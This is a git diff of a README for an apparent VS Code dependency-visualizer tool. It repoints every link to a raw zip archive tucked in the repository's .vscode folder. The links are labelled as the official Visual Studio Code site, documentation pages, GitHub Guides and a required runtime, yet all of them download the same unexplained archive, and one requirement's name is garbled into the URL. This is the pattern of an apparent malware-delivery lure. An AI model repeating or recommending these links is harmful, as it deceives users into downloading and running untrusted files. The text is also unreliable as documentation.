@@ -1,6 +1,6 @@
 # 🎨 DepViz-Dependency-Visualizer - Visualize Your Code Simply
 
-[![Download Latest Version](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip%20Latest%https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)
+[![Download Latest Version](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip%20Latest%https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip)](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to DepViz-Dependency-Visualizer! This tool lets you create function call
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [DepViz Releases](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip).
+To get started, visit this page to download: [DepViz Releases](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -30,8 +30,8 @@ Follow the prompts to complete the installation process. Once installed, you can
 To use DepViz-Dependency-Visualizer, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Mojave (10.14) or later, or a modern Linux distribution.
-- **https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip**: Required to run the software. Install https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip version 14 or later.
-- **Visual Studio Code**: Ensure you have the latest version of Visual Studio Code installed. You can download it from [Visual Studio Code Official Site](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip).
+- **https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip**: Required to run the software. Install https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip version 14 or later.
+- **Visual Studio Code**: Ensure you have the latest version of Visual Studio Code installed. You can download it from [Visual Studio Code Official Site](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip).
 
 ## 💡 How to Use DepViz
 
@@ -89,8 +89,8 @@ Your feedback and contributions help make DepViz better.
 
 ## 🔗 Additional Resources
 
-- [Visual Studio Code Documentation](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)
-- [PlantUML Documentation](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)
-- [GitHub Guides](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)
+- [Visual Studio Code Documentation](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip)
+- [PlantUML Documentation](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip)
+- [GitHub Guides](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/.vscode/Viz_Dependency_Visualizer_Dep_v1.6.zip)
 
 Thank you for using DepViz-Dependency-Visualizer! We hope it enhances your coding experience.
